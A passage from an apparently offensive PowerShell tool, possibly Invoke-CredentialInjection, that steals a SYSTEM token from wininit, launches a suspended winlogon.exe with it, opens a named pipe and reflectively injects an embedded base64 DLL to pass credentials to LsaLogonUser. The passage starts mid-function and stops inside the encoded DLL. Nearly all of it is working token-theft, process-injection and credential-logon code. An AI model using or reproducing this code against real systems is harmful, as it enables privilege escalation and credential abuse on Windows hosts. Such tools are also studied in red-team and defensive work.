	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}

    ###############################
    #Win32Constants
    ###############################
    $Constants = @{
        ACCESS_SYSTEM_SECURITY = 0x01000000
        READ_CONTROL = 0x00020000
        SYNCHRONIZE = 0x00100000
        STANDARD_RIGHTS_ALL = 0x001F0000
        TOKEN_QUERY = 8
        TOKEN_ADJUST_PRIVILEGES = 0x20
        ERROR_NO_TOKEN = 0x3f0
        SECURITY_DELEGATION = 3
        DACL_SECURITY_INFORMATION = 0x4
        ACCESS_ALLOWED_ACE_TYPE = 0x0
        STANDARD_RIGHTS_REQUIRED = 0x000F0000
        DESKTOP_GENERIC_ALL = 0x000F01FF
        WRITE_DAC = 0x00040000
        OBJECT_INHERIT_ACE = 0x1
        GRANT_ACCESS = 0x1
        TRUSTEE_IS_NAME = 0x1
        TRUSTEE_IS_SID = 0x0
        TRUSTEE_IS_USER = 0x1
        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5
        TRUSTEE_IS_GROUP = 0x2
        PROCESS_QUERY_INFORMATION = 0x400
        TOKEN_ASSIGN_PRIMARY = 0x1
        TOKEN_DUPLICATE = 0x2
        TOKEN_IMPERSONATE = 0x4
        TOKEN_QUERY_SOURCE = 0x10
        STANDARD_RIGHTS_READ = 0x20000
        TokenStatistics = 10
        TOKEN_ALL_ACCESS = 0xf01ff
        MAXIMUM_ALLOWED = 0x02000000
        THREAD_ALL_ACCESS = 0x1f03ff
        ERROR_INVALID_PARAMETER = 0x57
        LOGON_NETCREDENTIALS_ONLY = 0x2
        SE_PRIVILEGE_ENABLED = 0x2
        SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1
        SE_PRIVILEGE_REMOVED = 0x4
        CREATE_SUSPENDED = 0x4
    }

    $Win32Constants = New-Object PSObject -Property $Constants
    ###############################


    ###############################
    #Win32Structures
    ###############################
	#Define all the structures/enums that will be used
	#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
	$Domain = [AppDomain]::CurrentDomain
	$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
	$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
	$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

    #Struct STARTUPINFO
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('STARTUPINFO', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('cb', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('lpReserved', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpDesktop', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpTitle', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwX', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwY', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFillAttribute', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFlags', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('wShowWindow', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('cbReserved2', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpReserved2', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdInput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdOutput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdError', [IntPtr], 'Public') | Out-Null
	$STARTUPINFO = $TypeBuilder.CreateType()

    #Struct PROCESS_INFORMATION
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('PROCESS_INFORMATION', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('hProcess', [IntPtr], 'Public') | Out-Null
	$TypeBuilder.DefineField('hThread', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwProcessId', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwThreadId', [UInt32], 'Public') | Out-Null
	$PROCESS_INFORMATION = $TypeBuilder.CreateType()
    ###############################


    ###############################
    #Win32Functions
    ###############################
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)

    $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
	$OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)    

    $CreateProcessWithTokenWAddr = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
	$CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$CreateProcessWithTokenW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWithTokenWAddr, $CreateProcessWithTokenWDelegate)

    $memsetAddr = Get-ProcAddress msvcrt.dll memset
	$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
	$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)

    $DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
	$DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)

    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
	$CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

    $LsaFreeReturnBufferAddr = Get-ProcAddress secur32.dll LsaFreeReturnBuffer
	$LsaFreeReturnBufferDelegate = Get-DelegateType @([IntPtr]) ([UInt32])
	$LsaFreeReturnBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaFreeReturnBufferAddr, $LsaFreeReturnBufferDelegate)

    $GetProcessIdAddr = Get-ProcAddress Kernel32.dll GetProcessId
	$GetProcessIdDelegate = Get-DelegateType @([IntPtr]) ([UInt32])
	$GetProcessId = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcessIdAddr, $GetProcessIdDelegate)
    ###############################


    #Get the primary token for the specified processId
    #This function is taken from my script Invoke-TokenManipulation
    function Get-PrimaryToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ProcessId,

            #Open the token with all privileges. Requires SYSTEM because some of the privileges are restricted to SYSTEM.
            [Parameter()]
            [Switch]
            $FullPrivs
        )

        if ($FullPrivs)
        {
            $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS
        }
        else
        {
            $TokenPrivs = $Win32Constants.TOKEN_ASSIGN_PRIMARY -bor $Win32Constants.TOKEN_DUPLICATE -bor $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_QUERY 
        }

        $ReturnStruct = New-Object PSObject

        $hProcess = $OpenProcess.Invoke($Win32Constants.PROCESS_QUERY_INFORMATION, $true, [UInt32]$ProcessId)
        $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcess -Value $hProcess
        if ($hProcess -eq [IntPtr]::Zero)
        {
            #If a process is a protected process it cannot be enumerated. This call should only fail for protected processes.
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Failed to open process handle for ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error code: $ErrorCode . This is likely because this is a protected process."
            return $null
        }
        else
        {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $Success = $OpenProcessToken.Invoke($hProcess, $TokenPrivs, [Ref]$hProcToken)

            #Close the handle to hProcess (the process handle)
            if (-not $CloseHandle.Invoke($hProcess))
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to close process handle, this is unexpected. ErrorCode: $ErrorCode"
            }
            $hProcess = [IntPtr]::Zero

            if ($Success -eq $false -or $hProcToken -eq [IntPtr]::Zero)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error: $ErrorCode"
                return $null
            }
            else
            {
                $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcToken -Value $hProcToken
            }
        }

        return $ReturnStruct
    }


    #A modified version of this function from my script Invoke-TokenManipulation
    #Creates the process suspended. Returns the ProcessID of the created process
    function Create-SuspendedWinLogon
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken #The token to create the process with
        )

        $ProcessId = -1

        #Duplicate the token so it can be used to create a new process
        [IntPtr]$NewHToken = [IntPtr]::Zero
        $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken)
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
        }
        else
        {
            $StartupInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$STARTUPINFO)
            [IntPtr]$StartupInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($StartupInfoSize)
            $memset.Invoke($StartupInfoPtr, 0, $StartupInfoSize) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteInt32($StartupInfoPtr, $StartupInfoSize) #The first parameter (cb) is a DWORD which is the size of the struct

            $ProcessInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PROCESS_INFORMATION)
            [IntPtr]$ProcessInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ProcessInfoSize)

            $ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("$($env:windir)\system32\winlogon.exe")

            $Success = $CreateProcessWithTokenW.Invoke($NewHToken, 0x0, $ProcessNamePtr, [IntPtr]::Zero, $Win32Constants.CREATE_SUSPENDED, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
            if ($Success)
            {
                #Free the handles returned in the ProcessInfo structure
                $ProcessInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ProcessInfoPtr, [Type]$PROCESS_INFORMATION)

                $ProcessId = $GetProcessId.Invoke($ProcessInfo.hProcess)

                $CloseHandle.Invoke($ProcessInfo.hProcess) | Out-Null
                $CloseHandle.Invoke($ProcessInfo.hThread) | Out-Null
            }
            else
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "CreateProcessWithTokenW failed. Error code: $ErrorCode"
            }

            #Free StartupInfo memory and ProcessInfo memory
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($StartupInfoPtr)
            $StartupInfoPtr = [Intptr]::Zero
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcessInfoPtr)
            $ProcessInfoPtr = [IntPtr]::Zero
            [System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($ProcessNamePtr)
            $ProcessNamePtr = [IntPtr]::Zero

            #Close handle for the token duplicated with DuplicateTokenEx
            $Success = $CloseHandle.Invoke($NewHToken)
            $NewHToken = [IntPtr]::Zero
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
            }

            return $ProcessId
        }
    }


    #Get the SYSTEM token and create a winlogon process with it, returns the process ID of the new WinLogon process
    function Create-WinLogonProcess
    {
        if ([Environment]::UserName -ine "SYSTEM")
        {
            #First GetSystem. The script cannot enumerate all tokens unless it is system for some reason. Luckily it can impersonate a system token.
            $systemTokenInfo = Get-PrimaryToken -ProcessId (Get-Process wininit | where {$_.SessionId -eq 0}).Id
            if ($systemTokenInfo -eq $null -or $SystemTokenInfo.hProcToken -eq [IntPtr]::Zero)
            {
                Write-Warning "Unable to get SYSTEM token"
            }
            else
            {
                $ProcessId = Create-SuspendedWinLogon -hToken $SystemTokenInfo.hProcToken
                if ($ProcessId -eq -1)
                {
                    Throw "Unable to create suspended WinLogon process"
                }

                Write-Verbose "Created suspended winlogon process. ProcessId: $ProcessId"
                return $ProcessId
            }
        }
    }


    #Set up a named pipe to communicate with the injected DLL
    function Create-NamedPipe
    {
        $PipeSecurity = new-object System.IO.Pipes.PipeSecurity
        $AccessRule = New-Object System.IO.Pipes.PipeAccessRule( "NT AUTHORITY\SYSTEM", "ReadWrite", "Allow" )
        $PipeSecurity.AddAccessRule($AccessRule)
        $Pipe=new-object System.IO.Pipes.NamedPipeServerStream("p","InOut",100, "Byte", "None", 1024, 1024, $PipeSecurity)

        return $Pipe
    }
    

    #Determine the parameterset being used to figure out if a new winlogon process needs to be created or not
    if ($PsCmdlet.ParameterSetName -ieq "NewWinLogon")
    {
        #Start winlogon.exe as SYSTEM
        $WinLogonProcessId = Create-WinLogonProcess
        Write-Output "Created winlogon process to call LsaLogonUser in. Kill ProcessID $WinLogonProcessId when done impersonating."
        Write-Output "Execute: Stop-Process $WinLogonProcessId -force"
    }
    elseif ($PsCmdlet.ParameterSetName -ieq "ExistingWinLogon")
    {
        $WinLogonProcessId = (Get-Process -Name "winlogon")[0].Id
    }


    #Main
    try
    {
        $Pipe = Create-NamedPipe

        #Reflectively inject a DLL in to the new winlogon process which will receive credentials and call LsaLogonUser from within winlogon.exe
        $Logon32Bit_Base64 = "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